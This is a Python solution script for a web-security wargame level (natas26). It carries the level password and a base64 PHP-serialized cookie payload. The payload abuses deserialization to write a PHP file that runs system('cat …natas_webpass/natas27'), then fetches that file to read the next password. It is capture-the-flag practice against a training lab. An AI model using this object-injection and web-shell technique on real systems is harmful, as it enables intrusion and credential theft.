#!/usr/bin/env python

import requests
import re
import urllib
import base64

username = 'natas26'
password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()


response = session.get(url, auth=(username, password))
session.cookies['drawing'] =  ' Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
response = session.get(url + '?x1=0&y1=0&x2=500&y2=500',
                       auth=(username, password))
response = session.get(url + '/img/winner.php', auth=(username, password))
content = response.text
print(content)
print('='*80)
# print(session.cookies)
# data = session.cookies['drawing']

# dataDecoded = (urllib.parse.unquote(data))
# print(base64.b64decode(dataDecoded))
# PHP serialized data : b'a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'

# output = open('output.html', 'w')
# output.write(content)
